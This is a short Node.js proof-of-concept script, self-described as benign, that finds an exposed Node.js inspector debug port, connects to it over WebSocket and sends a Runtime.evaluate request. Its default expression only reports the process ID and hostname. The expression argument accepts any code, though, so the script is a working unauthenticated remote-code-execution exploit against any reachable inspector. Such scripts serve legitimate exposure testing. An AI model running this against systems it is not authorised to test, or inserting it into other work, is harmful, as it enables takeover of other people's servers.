#!/usr/bin/env node
// Benign PoC: Node --inspect (9229) unauthenticated evaluation proof.
const http = require('http');
const WebSocket = require('ws');

const host = process.argv[2] || '127.0.0.1:9229';
const expr = process.argv[3] || "process.pid + ' @ ' + require('os').hostname()";

// 1. Fetch the inspector targets via HTTP GET
http.get(`http://${host}/json/list`, (res) => {
  let data = '';

  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    try {
      const targets = JSON.parse(data);
      if (!targets || targets.length === 0) {
        console.error('[-] No inspector targets found.');
        process.exit(1);
      }

      const wsUrl = targets[0].webSocketDebuggerUrl;
      console.log('[+] EXPOSED inspector:', wsUrl);

      // 2. Connect to the V8 Inspector via WebSocket
      const ws = new WebSocket(wsUrl);

      ws.on('open', () => {
        const payload = {
          id: 1,
          method: 'Runtime.evaluate',
          params: {
            expression: expr,
            includeCommandLineAPI: true,
            returnByValue: true,
          },
        };
        ws.send(JSON.stringify(payload));
      });

      ws.on('message', (message) => {
        const msg = JSON.parse(message.toString());
        if (msg.id === 1) {
          console.log('[+] Eval:', JSON.stringify(msg.result, null, 2));
          ws.close();
        }
      });

      ws.on('error', (err) => {
        console.error('[-] WebSocket error:', err.message);
      });

    } catch (err) {
      console.error('[-] Failed to parse response:', err.message);
    }
  });
}).on('error', (err) => {
  console.error('[-] Request error:', err.message);
});
